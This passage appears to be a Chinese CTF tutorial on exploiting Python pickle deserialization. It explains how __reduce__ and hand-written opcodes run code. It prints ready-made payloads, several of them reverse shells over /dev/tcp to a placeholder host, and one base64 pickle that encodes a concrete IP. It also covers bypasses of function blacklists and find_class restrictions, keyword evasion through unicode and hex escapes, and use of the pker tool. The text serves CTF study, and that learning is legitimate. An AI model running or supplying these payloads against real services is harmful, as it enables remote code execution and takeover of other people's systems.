<li>定义了一个继承自object类的genpoc类。<strong>这是python中的常见做法，以确保类的行为符合预期</strong></li>
<li>在<code>genpoc</code>类内部，你重写了<code>__reduce__</code>方法。<strong>这个方法由<code>pickle</code>模块用来确定如何序列化和反序列化一个对象。</strong></li>
<li>在<code>__reduce__</code>方法内部，你定义了一个命令<code>echo test &gt; poc.txt</code>。当执行这个命令时，它会创建一个名为<code>poc.txt</code>的文件，内容为<code>test</code>。</li>
<li>从<code>__reduce__</code>方法<strong>返回了一个元组<code>(os.system,(s,))</code>。</strong><u>这告诉pickle模块在解Pickle对象时调用<code>os.system</code>和命令<code>s</code></u>。这种特定格式的原因是**<code>__reduce__</code>方法必须返回一个元组或字符串**（由于元组才有用所以基本都是利用元组）。元组的第一个元素是一个可调用的对象（在这种情况下时<code>os.system</code>），其余元素是该可调用对象的参数。</li>
<li>最后创建了一个<code>genpoc</code>类的实例<code>e</code>，然后使用<code>pickle.dumps(e)</code>对其进行了pickle。这创建了一个对象的序列化表示，可以稍后解pickle以执行命令</li>
</ol>
<p><strong>其他个人困惑解析：</strong></p>
<p><u>1.为什么这里的参数为<code>(s,)</code>这种格式，其中的逗号起什么作用</u>：</p>
<p>解析：在python中，元组是一种不可变的序列类型，用于存储一系列项目。<strong>元组中的项目用逗号分隔，并且整个元组被括号包围</strong>，在这个脚本中，<code>(s,)</code>是一个只包含一个元素的元组。逗号在这里起着非常重要的作用，<strong>因为它是区分元组和单个表达式的关键</strong>。</p>
<p>如果只写<code>(s)</code>，python会将其识别为一个单独的表达式，而不是包含一个元素的元组。因此，在这个脚本中，<code>(s,)</code>是一个包含一个元素的元组，该元素是要执行的命令。当<code>os.system</code>被调用时，它会将这个元组作为参数，从而执行命令。</p>
<h6 id="当环境没有os模块（常用）"><a href="#当环境没有os模块（常用）" class="headerlink" title="当环境没有os模块（常用）"></a>当环境没有os模块（常用）</h6><p>就需要生成一个让环境执行引入os模块的指令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">haha</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;&#x27;&#x27;__import__(&quot;os&quot;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxx/2333 0&gt;&amp;1&#x27;&quot;).read()&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;改为&quot;也行具体个人用，不是固定的</span></span><br><span class="line">a = haha()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a))</span><br><span class="line"><span class="comment"># b&#x27;gASVcgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxWX19pbXBvcnRfXygib3MiKS5wb3BlbigiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzIzMzMgMD4mMSciKS5yZWFkKCmUhZRSlC4=&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最好所有的poc在Linux上生成</p>
<h5 id="变量覆盖："><a href="#变量覆盖：" class="headerlink" title="变量覆盖："></a>变量覆盖：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a = <span class="string">b&#x27;321&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(key1, key2)</span><br></pre></td></tr></table></figure>

<p>上面的两个方法使用的<code>__reduce__方法</code>其实就是对应的opcode中的R指令。</p>
<h3 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h3><h4 id="简单的利用以及绕过"><a href="#简单的利用以及绕过" class="headerlink" title="简单的利用以及绕过"></a>简单的利用以及绕过</h4><h6 id="函数过滤"><a href="#函数过滤" class="headerlink" title="函数过滤"></a>函数过滤</h6><p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制</p>
<p>比如2018-XCTF-HITB-WEB : Python’s-Revenge。给了很长一串黑名单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">black_type_list = [<span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.<span class="built_in">open</span>, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.<span class="built_in">open</span>, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.<span class="built_in">open</span>, posixfile.fileopen]</span><br></pre></td></tr></table></figure>

<p> 但是这里**platform.popen()**不在名单里，它可以做到类似<code>system</code>的功能（想要利用应该还是需要<code>import platform</code>）。</p>
<p>另外，还有可以<strong>利用map()函数</strong>来干这件事：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"> 	<span class="keyword">return</span> <span class="built_in">map</span>,(os.system,[<span class="string">&quot;ls&quot;</span>])</span><br></pre></td></tr></table></figure>

<p> 总之，黑名单不可取，如果禁止掉<code>R</code>这个指令码，那么reduce这一套方法都不能再使用。</p>
<h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><p>与命令执行相关的opcode有三个：<code>R</code>、<code>i</code>、<code>o</code>，所以我们可以从三个方向进行构造。（测试了一下，下面的几种指令都能用），还可以使用<code>b</code>，看后面的稍难过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R可用</span><br><span class="line"></span><br><span class="line">b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i可用  ==》INST</span><br><span class="line"></span><br><span class="line">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o可用  ==》OBJ</span><br><span class="line"></span><br><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">特殊情况</span><br><span class="line">无R,i,o,但是os可用</span><br><span class="line">b&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;calc&#x27;\nos.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">无R,i,o os  可过关键词过滤（还是比较重要）</span><br><span class="line">b&#x27;&#x27;&#x27;(S&#x27;key1&#x27;\nS&#x27;val1&#x27;\ndS&#x27;vul&#x27;\n(cos\nsystem\nVcalc\nos.&#x27;&#x27;&#x27;</span><br><span class="line">V操作码是可以识别\u ，所以如果过滤了关键字还可以将命令unicode编码也能识别。</span><br></pre></td></tr></table></figure>

<p>注意：如果想拼接的payload就使用\n代表换行，这样才方便生成payload，但是需要注意的就是如果用赛博厨子 会将 \n 当作字符处理，易出错</p>
<p><strong>利用方式：</strong></p>
<p>最好如下在s那里加上encode()，这样才不会因为base64函数问题报str的错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(s.encode()))</span><br></pre></td></tr></table></figure>

<h6 id="绕过显示字符串检测-关键字绕过"><a href="#绕过显示字符串检测-关键字绕过" class="headerlink" title="绕过显示字符串检测-关键字绕过"></a>绕过显示字符串检测-关键字绕过</h6><p><code>V</code>操作符可以进行unicode编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Vsecr\u0065t</span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure>

<p><code>S</code>操作符可以识别十六进制：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S<span class="string">&#x27;\x73ecret&#x27;</span></span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure>

<p>等比如过滤os关键字等小绕过可以小部分参考ssti的绕过手法</p>
<p><strong>注意：</strong>其实上述的R指令在现在已经很难生效了，通常都会对指令码进行过滤，需要结合对整个过程的理解来绕过。R被过滤情况下可以尝试其他几种过滤。（但是个人理解，都有一个缺点：<strong>只能执行单一的函数，很难构造复杂的操作</strong>）</p>
<h4 id="稍进阶绕过"><a href="#稍进阶绕过" class="headerlink" title="稍进阶绕过"></a>稍进阶绕过</h4><p>建议看：<a href="https://xz.aliyun.com/t/7012?time__1311=n4+xnD0GDti=d0Ic405+bDyi8Q0Q1OzDRmoD&alichlgref=https://xz.aliyun.com/t/7436?time__1311=n4%252BxnD0G0%253Dit0Q6qGNnmjt%253DDtNi%253DzdD9jDYwD&alichlgref=https%253A%252F%252Fwww.bing.com%252F#toc-0">文章1</a>与<a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjt=DtNi=zdD9jDYwD&alichlgref=https://www.bing.com/#toc-10">文章2</a>，并且有docker可以复现。</p>
<h5 id="如何手写opcode"><a href="#如何手写opcode" class="headerlink" title="如何手写opcode"></a>如何手写opcode</h5><p>如何手搓<a href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#title-5">参考文章</a></p>
<ul>
<li>在CTF中，很<strong>多时候需要一次执行多个函数或一次进行多个指令</strong>，此时就不能光用<code>__reduce__</code>来解决问题（reduce一次只能执行一个函数，当exec等函数被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。</li>
<li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
<li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。<strong>下文中，所有opcode为版本0的opcode</strong>。</li>
</ul>
<p>常用的opcode如下（还可以在<code>python31\Lib\pickle.py</code>里看到）：</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody></table>
<p>需要注意的地方：</p>
<ul>
<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库</li>
</ul>
<p><strong>如何拼接opcode：</strong><br>将第一个pickle流结尾表示结束的<code>.</code>去掉，将第二个pickle流与第一个拼接起来即可。</p>
<h5 id="利用pker工具"><a href="#利用pker工具" class="headerlink" title="利用pker工具"></a>利用pker工具</h5><p>注意：最好在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker</p>
<ul>
<li><p>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82%E8%A7%A3%E6%9E%90%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%81%E4%BD%9C%E8%80%85%E7%9A%84paper%EF%BC%9A[%E9%80%9A%E8%BF%87AST%E6%9D%A5%E6%9E%84%E9%80%A0Pickle">https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle</a> opcode](<a href="https://xz.aliyun.com/t/7012)%E3%80%82">https://xz.aliyun.com/t/7012)。</a></p>
</li>
<li><p>使用pker，可以很方便地编写<code>pickle opcode</code>（<strong>生成pickle版本0的opcode</strong>）。</p>
</li>
<li><p>pker的实现用到了python的ast（抽象语法树）库</p>
</li>
</ul>
<p><strong>pker可以实现的功能：</strong></p>
<ul>
<li>变量赋值：存在memo中，保存memo下标和变量名即可</li>
<li>函数调用</li>
<li>类型字面量构造</li>
<li>List和dict成员修改</li>
<li>对象成员变量修改</li>
</ul>
<p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p>
<h6 id="pker工具的使用方法"><a href="#pker工具的使用方法" class="headerlink" title="pker工具的使用方法"></a>pker工具的使用方法</h6><ol>
<li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">一下module都可以是包含`.`的子module</span><br><span class="line">调用函数时，注意传入的参数类型要和示例一致</span><br><span class="line">对应的opcode会被生成，但并不与pker代码相互等价</span><br><span class="line"></span><br><span class="line">GLOBAL</span><br><span class="line">对应opcode：b&#x27;c&#x27;</span><br><span class="line">huoqu1module下的一个全局对象（没有import的也可以，比如下面的os）：</span><br><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">输入：module,instance(callable、module都是instance)  </span><br><span class="line"></span><br><span class="line">INST</span><br><span class="line">对应opcode：b&#x27;i&#x27;</span><br><span class="line">建立并入栈一个对象（可以执行一个函数）：</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)  </span><br><span class="line">输入：module,callable,para </span><br><span class="line"></span><br><span class="line">OBJ</span><br><span class="line">对应opcode：b&#x27;o&#x27;</span><br><span class="line">建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;) </span><br><span class="line">输入：callable,para</span><br><span class="line"></span><br><span class="line">xxx(xx,...)</span><br><span class="line">对应opcode：b&#x27;R&#x27;</span><br><span class="line">使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用） //应该即是reduce方法</span><br><span class="line"></span><br><span class="line">li[0]=321</span><br><span class="line">或</span><br><span class="line">globals_dic[&#x27;local_var&#x27;]=&#x27;hello&#x27;</span><br><span class="line">对应opcode：b&#x27;s&#x27;</span><br><span class="line">更新列表或字典的某项的值</span><br><span class="line"></span><br><span class="line">xx.attr=123</span><br><span class="line">对应opcode：b&#x27;b&#x27;</span><br><span class="line">对xx对象进行属性设置</span><br><span class="line"></span><br><span class="line">return</span><br><span class="line">对应opcode：b&#x27;0&#x27;</span><br><span class="line">出栈（作为pickle.loads函数的返回值）：</span><br><span class="line">return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test=&quot;123&quot;</span><br><span class="line">return test</span><br></pre></td></tr></table></figure>

<p>被解析为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&quot;S&#x27;123&#x27;\np0\n0g0\n.&quot;</span><br></pre></td></tr></table></figure>

<h6 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h6><ul>
<li>通过<code>b&#39;R&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=&#x27;whoami&#x27;</span><br><span class="line">system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">system(s) # `b&#x27;R&#x27;`调用</span><br><span class="line">return</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;i&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>多参数调用函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;[module]&#x27;, &#x27;[callable]&#x27;[, par0,par1...])</span><br><span class="line">OBJ(GLOBAL(&#x27;[module]&#x27;, &#x27;[callable]&#x27;)[, par0,par1...])</span><br></pre></td></tr></table></figure>

<p>等如变量覆盖参考指定的文章，遇到题再学</p>
<h6 id="如何自动化构造"><a href="#如何自动化构造" class="headerlink" title="如何自动化构造"></a>如何自动化构造</h6><p>文章已经将得比较清楚了，这里稍微说说，体会一下思想：</p>
<p>如下方式利用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ cat test/code_breaking</span><br><span class="line"><span class="built_in">getattr</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">dict_get = <span class="built_in">getattr</span>(<span class="built_in">dict</span>, <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="built_in">globals</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>)</span><br><span class="line">builtins = <span class="built_in">globals</span>()</span><br><span class="line">__builtins__ = dict_get(builtins, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span> = <span class="built_in">getattr</span>(__builtins__, <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">$ python3 pker.py &lt; test/code_breaking</span><br><span class="line"><span class="string">b&#x27;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&#x27;get\&#x27;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&#x27;__builtins__\&#x27;\ntRp5\n0g0\n(g5\nS\&#x27;eval\&#x27;\ntRp6\n0g6\n(S\&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)\&#x27;\ntR.&#x27;</span></span><br></pre></td></tr></table></figure>



<h5 id="对opcode的利用"><a href="#对opcode的利用" class="headerlink" title="对opcode的利用"></a>对opcode的利用</h5><h6 id="绕过find-class函数"><a href="#绕过find-class函数" class="headerlink" title="绕过find_class函数"></a>绕过find_class函数</h6><p><a href="https://xz.aliyun.com/t/14061?time__1311=mqmx9DBG0Qi=oGNDQiiQGkf=6ERiKd4D&alichlgref=https://cn.bing.com/">参考文章</a></p>
<p>上面在对find_class函数说明的时候，已经可以知道一般防护都是在find_class函数上做文章，那么现在稍微说说是如何绕过的：</p>
<p>比如如下限制：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br></pre></td></tr></table></figure>

<p>可以对应简单绕过的函数绕过，案例可以尝试使用函数绕过，还是可以看看。</p>
<p><strong>思路一 获取危险函数</strong></p>
<p>和SSTI和沙箱逃逸的思路类似,可以通过构造类对象链调用某些方法中含有危险函数的类实现绕过.我们只需要构造形如<code>builtins.getattr(builtins,&quot;eval&quot;)(command)</code>的payload即可实现绕过</p>
<ul>
<li>利用<code>sys.module</code>获取危险函数</li>
</ul>
<p><code>sys.module</code>是一个全局字典，这个知识点会在学习沙箱逃逸的时候重点学习..<code>sys.modules</code>这个字典的键是模块名,值是模块本身.所以我们可以通过<code>get(sys.modules,&quot;moduleName&quot;)</code>的方法获取危险模块.</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(builtins.dict,&quot;get&quot;)(sys.modules,&quot;os&quot;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<p>给pker的输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">mod=GLOBAL(<span class="string">&#x27;sys&#x27;</span>,<span class="string">&#x27;modules&#x27;</span>)</span><br><span class="line">os=get(mod,<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">system=<span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&quot;whoami&quot;</span>)</span><br><span 